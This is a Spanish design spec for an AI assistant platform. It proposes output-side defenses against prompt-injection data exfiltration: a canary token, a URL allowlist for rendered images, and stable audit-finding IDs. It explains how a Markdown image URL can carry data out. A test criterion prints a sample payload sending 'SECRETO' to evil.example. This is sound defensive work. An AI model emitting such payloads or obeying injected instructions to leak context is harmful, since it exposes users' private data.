---
status: PROPOSED
priority: P2
developer_type: agent-single
created: 2026-10-20
author: Savia
phase: D
risk: L3
related_specs: [SPEC-193, SE-028, SE-060, SE-220, SE-434, SE-443]
origin: output/research/20261020-learnings-inditex.md (L4); output/research/20261020-learnings-goose-gentledot-rea.md (G9)
resource: https://github.com/InditexTech/cerbia
---

# SE-448 — Fuga por salida de contenido externo: token canario, lista de destinos de URL y ID estable de hallazgos

## Problema

Savia lee contenido que no controla (páginas web, respuestas de MCP, transcripciones, ficheros de
cliente) y lo mete en el contexto de agentes con herramientas. La inyección indirecta busca dos cosas:
cambiar lo que hace el agente y **sacar datos**. La defensa de entrada está bastante cubierta; la de
salida, no:

- **Entrada, ya cubierta (no se repite aquí):** `scripts/context-sanitize/normalize.py` y el hook
  `context-sanitize-input.sh` (SPEC-193, `IMPLEMENTED`) normalizan y eliminan caracteres invisibles;
  `prompt-injection-guard.sh` (SE-028) bloquea caracteres de ancho cero; el escáner de prompts
  (SE-060, PS-11) los detecta en agentes y skills. El informe de investigación original proponía un
  escáner de texto invisible: **se descarta por duplicado**.
- **Salida de datos, hueco:** no hay token canario que delate que el contenido de contexto privado
  acaba en una petición saliente (`memory-canary-check.sh`, SE-220, comprueba invariantes de la
  memoria, no fugas). No hay lista de destinos permitidos para URLs en lo que el agente escribe y la
  interfaz renderiza (búsqueda de «url allowlist» / «allowlist de url»: sin resultados). Una imagen
  Markdown con una URL cuya consulta lleva datos se descarga sola al renderizarse.
- **Trazabilidad:** el guard de inyección audita en `output/injection-audit.jsonl`, pero sin un
  identificador estable por hallazgo que permita ligar una decisión humana («permitir una vez»,
  «denegar») al hallazgo concreto y estudiar los falsos positivos.

## Valor y evidencia

- Cerbia (Inditex Tech, Apache-2.0) organiza sus controles como cadena `loaders → preprocessors →
  scanners → agregadores de puntuación → veredicto`, con escáneres de fuga de canario, URLs
  maliciosas y lista de URLs permitidas, y una regla que merece copiarse: **solo los hallazgos BLOCK
  determinan el veredicto; el resto se audita**. Avisa de que son señales heurísticas, no una
  certificación (documentación de componentes, lectura sin ejecutar).
- goose (Apache-2.0) etiqueta sus hallazgos con ID (`SEC-…`) y confianza, hace configurable el umbral
  y liga la decisión humana al ID en el registro.
- No hay medición de incidencias propias de este tipo; el valor es de reducción de superficie, no una
  mejora demostrada. Por eso S0 mide antes de construir.

## Alcance

| Slice | Entrega |
|---|---|
| S0 | **Sonda**: qué superficies de Space renderizan Markdown con imágenes o enlaces remotos a partir de salida del agente; qué herramientas (`web-research`, navegador, MCP externos) introducen contenido no confiable. Informe con lista. Si ninguna renderiza recursos remotos, S1 se cierra como no aplicable. |
| S1 | Lista de destinos permitidos para URLs renderizadas automáticamente (imágenes, iframes): por defecto vacía, ampliable en configuración local. Un recurso fuera de la lista no se descarga, se muestra como enlace inerte y deja registro. |
| S2 | Token canario por sesión: se inyecta en el contexto de agentes que procesan contenido externo y un hook comprueba que no aparece en argumentos de herramientas salientes (web, MCP externo, `curl`/`wget` en Bash). Si aparece, bloquea la llamada y deja registro. Es señal heurística, no prueba de ausencia de fugas. |
| S3 | ID estable por hallazgo en `output/injection-audit.jsonl` (`id`, `confidence`) y campo `decision` ligado al ID cuando la persona decide. Sin cambios de umbrales. |

## Fuera de alcance

- Detección de texto invisible, normalización Unicode y homoglifos (ya cubiertos, ver Problema).
- Clasificadores de inyección por modelo, locales o remotos: los remotos chocan con la regla de que
  N3+ no sale; los locales se evalúan aparte con el corpus de `classifier-corpus-run.sh`.
- Adoptar Cerbia como dependencia (Python ≥ 3.12 y extras de aprendizaje automático; su lista de
  licencias de terceros incluye GPL-3.0-or-later y MPL-2.0, sin revisar para redistribuir).
- Detección de PII: la cubre `confidentiality-scan.sh` y la regla de datos.

## Criterios de aceptación

| AC | Verificación |
|---|---|
| AC1 | S0 publica `docs/evidence/SE-448-S0-render-surfaces.md` con cada superficie, si renderiza recursos remotos y cómo se comprobó. |
| AC2 | Test de S1 (si aplica): una salida con `![x](https://evil.example/?d=SECRETO)` no genera petición a `evil.example` (el cliente de prueba registra cero peticiones) y se muestra como enlace inerte; un host de la lista sí se carga. |
| AC3 | Test de S2: con canario `CANARY-7f3a…` inyectado, una llamada de herramienta saliente cuyo argumento lo contiene se bloquea con código 2; la misma sin el canario pasa. |
| AC4 | S2 no bloquea cuando el canario aparece solo en la respuesta al usuario (no es salida a un tercero), verificado con un caso. |
| AC5 | Test de S3: dos hallazgos distintos reciben IDs distintos y estables entre ejecuciones con la misma entrada; una decisión de la persona queda ligada al ID. |
| AC6 | Corpus de 20 textos legítimos en español con emoji, enlaces y Markdown: S1 y S2 no producen bloqueos (falsos positivos = 0); el resultado se publica. |
| AC7 | `capability-entropy.py --check` PASS y `validate-ci-local.sh --quick` verde. |

## Riesgos

- Falsos positivos de la lista de destinos (imágenes legítimas de documentación): lista ampliable y
  registro visible; S0 evita construir si no hay superficie.
- El canario solo detecta fugas literales; datos reformulados o codificados lo evaden. Se declara en
  la regla de uso; no sustituye al proxy de destinos de SE-434.
- Coste de contexto del canario: una línea por sesión.
- Dos hooks más en el camino de cada herramienta saliente: medir latencia antes de activar por defecto.

## Licencia de lo reutilizado

Cerbia es Apache-2.0 y goose Apache-2.0; ambos compatibles con la licencia MIT de Savia. Se reutilizan
ideas y la taxonomía «solo BLOCK decide»; no se copia código ni se empaqueta la dependencia.

## Esfuerzo

S0 S, S1 S, S2 M, S3 S.

## Decisiones pendientes de la operadora

- **D1**: si S1 se construye solo con evidencia de superficie (S0) o se adelanta como defensa por defecto.
- **D2**: valor por defecto de la lista de destinos (propuesta: vacía).
- **D3**: ámbito del canario: todos los agentes o solo los que usan herramientas de red.

## Referencias cruzadas

SPEC-193 (sanitización de entrada), SE-028 (guard de inyección), SE-060 (escáner de prompts), SE-220
(defensas anti-jailbreak, origen del chequeo canario de memoria), SE-434 (proxy de destinos de red),
SE-443 (conectores MCP: origen de contenido externo).

## OpenCode Implementation Plan

### Bindings touched

| Componente | Claude Code | OpenCode v1.14 |
|---|---|---|
| Hook de canario (S2) | PreToolUse registrado en `.claude/settings.json` | función del plugin `savia-gates` |
| Registro de hallazgos (S3) | `prompt-injection-guard.sh` | mismo script |
| Lista de destinos (S1) | no aplica | `space-server` / interfaz de Space |

### Verification protocol

- [ ] S2 probado en OpenCode además de Claude Code.
- [ ] Mismas entradas en el guard bash y en su equivalente TypeScript, mismo resultado.
- [ ] Hook registrado en `savia-gates`.

### Portability classification

- [x] **DUAL_BINDING**: S2 y S3 en ambos desde la primera slice; S1 vive solo en Space.
